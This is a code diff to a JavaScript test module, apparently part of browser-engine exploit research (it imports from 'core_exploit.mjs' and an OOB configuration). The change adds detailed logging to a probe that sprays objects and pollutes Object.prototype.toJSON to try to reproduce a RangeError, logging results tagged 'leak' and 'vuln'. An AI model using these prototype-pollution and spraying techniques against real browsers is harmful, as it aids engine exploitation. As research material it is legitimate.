@@ -9,7 +9,6 @@ import {
 } from '../core_exploit.mjs';
 import { OOB_CONFIG } from '../config.mjs';
 
-// Usaremos a mesma classe MyComplexObjectForRangeError
 class MyComplexObjectForRangeError {
     constructor(id) {
         this.id = `MyComplexObjRE-${id}`;
@@ -24,41 +23,50 @@ class MyComplexObjectForRangeError {
     }
 }
 
-// toJSON que tenta acessar this[prop] dentro do loop for...in
-export function toJSON_ForInWithPropertyAccess() {
-    const FNAME_toJSON = "toJSON_ForInWithPropertyAccess";
+// toJSON que tenta acessar this[prop] dentro do loop for...in, com logging DETALHADO
+export function toJSON_ForInWithDetailedPropertyAccessLogging() {
+    const FNAME_toJSON = "toJSON_ForInDetailedAccessLog";
     let iteration_count = 0;
-    const MAX_ITER_LOG = 20; // Logar as primeiras N iterações
-    let props_payload = { variant: FNAME_toJSON, id_at_entry: "N/A", iterations_done: 0, props: {} };
+    const MAX_ITER_LOG_PROPS = 30; // Logar mais propriedades
+    const MAX_ITER_SAFETY_BREAK = 200; // Reduzido para ver se o safety break é atingido antes do RangeError
 
-    // Usar console.log para máxima chance de ver logs antes de um crash
-    console.log(`[${FNAME_toJSON}] Entrando.`);
+    let result_payload = {
+        variant: FNAME_toJSON,
+        id_at_entry: "N/A",
+        iterations_attempted: 0,
+        props_successfully_accessed: {},
+        last_prop_before_error: "N/A",
+        error_details: null
+    };
+
     try {
-        props_payload.id_at_entry = String(this?.id).substring(0,20); // Tenta ler ID na entrada
-        console.log(`[${FNAME_toJSON}] this.id na entrada: ${props_payload.id_at_entry}`);
-    } catch(e_id_entry) {
-        console.log(`[${FNAME_toJSON}] Erro ao ler this.id na entrada: ${e_id_entry.name}`);
-        props_payload.id_at_entry_error = e_id_entry.name;
+        result_payload.id_at_entry = String(this?.id).substring(0,20);
+        logS3(`[${FNAME_toJSON}] Entrando. this.id (tentativa): ${result_payload.id_at_entry}`, "info", FNAME_toJSON);
+    } catch(e_id) {
+        logS3(`[${FNAME_toJSON}] Erro ao ler this.id na entrada: ${e_id.name}`, "warn", FNAME_toJSON);
+        result_payload.id_at_entry = `Error: ${e_id.name}`;
     }
 
     try {
         if (typeof this !== 'object' || this === null) {
-            console.log(`[${FNAME_toJSON}] 'this' não é um objeto ou é nulo no início do loop.`);
-            props_payload.error = "this is not object or null at loop start";
-            return props_payload;
+            logS3(`[${FNAME_toJSON}] 'this' não é um objeto ou é nulo no início do loop.`, "warn", FNAME_toJSON);
+            result_payload.error_details = "this is not object or null at loop start";
+            return result_payload;
         }
 
         for (const prop in this) {
             iteration_count++;
-            if (iteration_count <= MAX_ITER_LOG) {
-                console.log(`[${FNAME_toJSON}] Iter: ${iteration_count}, Prop: '${prop}'`);
+            result_payload.iterations_attempted = iteration_count;
+            result_payload.last_prop_before_error = prop; // Atualiza a cada iteração
+
+            if (iteration_count <= MAX_ITER_LOG_PROPS) {
+                logS3(`[${FNAME_toJSON}] Iter: ${iteration_count}, Tentando acessar Prop: '${prop}'...`, "info", FNAME_toJSON);
             }
 
             try {
-                // TENTATIVA CRÍTICA DE ACESSAR A PROPRIEDADE
-                const val = this[prop]; // <<<< Este acesso pode ser o gatilho do RangeError
+                const val = this[prop]; // <<<< PONTO CRÍTICO DO ACESSO
 
-                if (iteration_count <= MAX_ITER_LOG) {
+                if (iteration_count <= MAX_ITER_LOG_PROPS) {
                     let val_str = "N/A";
                     const val_type = typeof val;
                     if (val_type !== 'function' && val_type !== 'object') {
@@ -70,38 +78,37 @@ export function toJSON_ForInWithPropertyAccess() {
                     } else if (val_type === 'function') {
                         val_str = `[Function ${val.name || ''}]`;
                     }
-                    console.log(`[${FNAME_toJSON}]   Prop '${prop}', Type: ${val_type}, Val_str: ${val_str}`);
-                    props_payload.props[prop] = { type: val_type, value_str: val_str };
+                    logS3(`[${FNAME_toJSON}]   Prop '${prop}' ACESSADA. Type: ${val_type}, Val_str: ${val_str}`, "good", FNAME_toJSON);
+                    result_payload.props_successfully_accessed[prop] = { type: val_type, value_str: val_str };
                 }
             } catch (e_access) {
-                console.error(`[${FNAME_toJSON}] ERRO ao acessar this['${prop}']: ${e_access.name} - ${e_access.message}`);
-                logS3(`[${FNAME_toJSON}] ERRO ao acessar this['${prop}'] para id ${this.id}: ${e_access.name} - ${e_access.message}`, "error", FNAME_toJSON);
-                props_payload.props[prop] = { error: `${e_access.name}: ${e_access.message}` };
-                // Continuar o loop para ver se outras propriedades causam problema ou se o RangeError é global
+                logS3(`[${FNAME_toJSON}]   ERRO AO ACESSAR this['${prop}']: ${e_access.name} - ${e_access.message}`, "error", FNAME_toJSON);
+                result_payload.errors_during_iteration = (result_payload.errors_during_iteration || []);
+                result_payload.errors_during_iteration.push(`Error accessing prop '${prop}': ${e_access.name} - ${e_access.message}`);
+                // Não vamos parar no primeiro erro de acesso, pode haver mais informações ou o RangeError pode ser diferente.
             }
 
-            if (iteration_count > 2000) { // Safety break
-                console.log(`[${FNAME_toJSON}] Safety break: Excedeu 2000 iterações.`);
-                logS3(`[${FNAME_toJSON}] Safety break: Excedeu 2000 iterações para this.id=${this.id}.`, "warn", FNAME_toJSON);
-                props_payload.max_iter_reached = true;
+            if (iteration_count > MAX_ITER_SAFETY_BREAK) {
+                logS3(`[${FNAME_toJSON}] Safety break: Excedeu ${MAX_ITER_SAFETY_BREAK} iterações. Última prop: '${prop}'.`, "warn", FNAME_toJSON);
+                result_payload.error_details = `Safety break after ${MAX_ITER_SAFETY_BREAK} iterations. Last prop: ${prop}.`;
+                result_payload.max_iterations_reached = true;
                 break;
             }
         }
-        console.log(`[${FNAME_toJSON}] Loop for...in completou ${iteration_count} iterações.`);
+        logS3(`[${FNAME_toJSON}] Loop for...in completou ${iteration_count} iterações.`, "info", FNAME_toJSON);
     } catch (e_loop) {
-        console.error(`[${FNAME_toJSON}] EXCEPTION NO LOOP for...in (externo ao acesso da prop): ${e_loop.name} - ${e_loop.message}`);
-        logS3(`[${FNAME_toJSON}] EXCEPTION NO LOOP for...in (externo ao acesso da prop) para this.id=${this.id}: ${e_loop.name} - ${e_loop.message}`, "error", FNAME_toJSON);
-        props_payload.outer_loop_error = `${e_loop.name}: ${e_loop.message}`;
+        // Este catch pegaria um erro no próprio mecanismo 'for...in', o que é raro.
+        // O RangeError geralmente acontece no acesso this[prop] ou na lógica de stringify.
+        logS3(`[${FNAME_toJSON}] EXCEPTION NO MECANISMO for...in: ${e_loop.name} - ${e_loop.message}`, "error", FNAME_toJSON);
+        result_payload.error_details = `EXCEPTION in for...in mechanism: ${e_loop.name}: ${e_loop.message}`;
     }
-    props_payload.iterations_done = iteration_count;
-    return props_payload;
+    return result_payload;
 }
 
-
 export async function executeForInPropertyAccessRETest() {
-    const FNAME_TEST = "executeForInPropertyAccessRETest";
-    logS3(`--- Iniciando Teste: Acesso a Propriedade em 'for...in' (RangeError Check) ---`, "test", FNAME_TEST);
-    document.title = `ForIn PropAccess RE Check`;
+    const FNAME_TEST = "executeForInPropertyAccessRETest_DetailedLog"; // Nome da função de teste atualizado
+    logS3(`--- Iniciando Teste: Acesso a Propriedade em 'for...in' (RangeError Check - Log Detalhado) ---`, "test", FNAME_TEST);
+    document.title = `ForIn PropAccess RE Detailed`;
 
     const spray_count = 5;
     const sprayed_objects = [];
@@ -136,7 +143,7 @@ export async function executeForInPropertyAccessRETest() {
 
     await PAUSE_S3(SHORT_PAUSE_S3);
 
-    logS3(`3. Sondando o primeiro MyComplexObjectForRangeError via JSON.stringify (com ${toJSON_ForInWithPropertyAccess.name})...`, "test", FNAME_TEST);
+    logS3(`3. Sondando o primeiro MyComplexObjectForRangeError via JSON.stringify (com ${toJSON_ForInWithDetailedPropertyAccessLogging.name})...`, "test", FNAME_TEST);
 
     const ppKey_val = 'toJSON';
     let originalToJSONProtoDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
@@ -152,30 +159,32 @@ export async function executeForInPropertyAccessRETest() {
 
     try {
         Object.defineProperty(Object.prototype, ppKey_val, {
-            value: toJSON_ForInWithPropertyAccess,
+            value: toJSON_ForInWithDetailedPropertyAccessLogging,
             writable: true, configurable: true, enumerable: false
         });
         toJSONPollutionApplied = true;
-        logS3(`   Object.prototype.toJSON poluído com ${toJSON_ForInWithPropertyAccess.name}.`, "info", FNAME_TEST);
+        logS3(`   Object.prototype.toJSON poluído com ${toJSON_ForInWithDetailedPropertyAccessLogging.name}.`, "info", FNAME_TEST);
 
         logS3(`   Testando objeto 0 (ID: ${obj_to_probe.id})... ESPERANDO RangeError POTENCIAL.`, 'warn', FNAME_TEST);
-        document.title = `Sondando MyComplexObj 0 (ForIn PropAccess RE)`;
+        document.title = `Sondando MyComplexObj 0 (ForIn Detailed RE)`;
         try {
-            console.log(`--- [${FNAME_TEST}] ANTES de JSON.stringify(obj_to_probe) ---`);
+            logS3(`--- [${FNAME_TEST}] ANTES de JSON.stringify(obj_to_probe) ---`, "info", FNAME_TEST);
             const stringifyResult = JSON.stringify(obj_to_probe);
-            console.log(`--- [${FNAME_TEST}] APÓS JSON.stringify(obj_to_probe) ---`);
+            logS3(`--- [${FNAME_TEST}] APÓS JSON.stringify(obj_to_probe) ---`, "info", FNAME_TEST);
             logS3(`     JSON.stringify(obj[0]) completou. Resultado da toJSON:`, "info", FNAME_TEST);
-            logS3(JSON.stringify(stringifyResult, null, 2), "leak", FNAME_TEST); // Log formatado
+            logS3(JSON.stringify(stringifyResult, null, 2), "leak", FNAME_TEST);
+            if(stringifyResult && stringifyResult.error_details) {
+                 logS3(`     Detalhe de erro da toJSON: ${stringifyResult.error_details}`, "warn", FNAME_TEST);
+            }
 
         } catch (e_str) {
-            console.error(`--- [${FNAME_TEST}] ERRO NO CATCH de JSON.stringify: ${e_str.name} ---`, e_str);
             logS3(`     !!!! ERRO AO STRINGIFY obj[0] !!!!: ${e_str.name} - ${e_str.message}`, "critical", FNAME_TEST);
             if (e_str.stack) {
                 logS3(`       Stack: ${e_str.stack}`, "error", FNAME_TEST);
             }
             if (e_str.name === 'RangeError') {
                 logS3(`       ---> RangeError: Maximum call stack size exceeded OCORREU! <---`, "vuln", FNAME_TEST);
-                document.title = `RangeError REPRODUCED! (PropAccess)`;
+                document.title = `RangeError REPRODUCED! (DetailedForIn)`;
             }
             problem_detected = true;
         }
@@ -191,14 +200,14 @@ export async function executeForInPropertyAccessRETest() {
     }
 
     if (!problem_detected) {
-        logS3("RangeError NÃO ocorreu com a toJSON que acessa this[prop].", "good", FNAME_TEST);
+        logS3("RangeError NÃO ocorreu com a toJSON de log detalhado.", "good", FNAME_TEST);
     }
 
     clearOOBEnvironment();
-    logS3(`--- Teste Acesso a Propriedade em 'for...in' (RangeError Check) CONCLUÍDO ---`, "test", FNAME_TEST);
+    logS3(`--- Teste Acesso a Propriedade em 'for...in' (RangeError Check - Log Detalhado) CONCLUÍDO ---`, "test", FNAME_TEST);
     if (document.title.includes("REPRODUCED")) {
         // Manter
     } else if (!problem_detected) {
-        document.title = `ForIn PropAccess OK`;
+        document.title = `ForIn DetailedLog OK`;
     }
 }
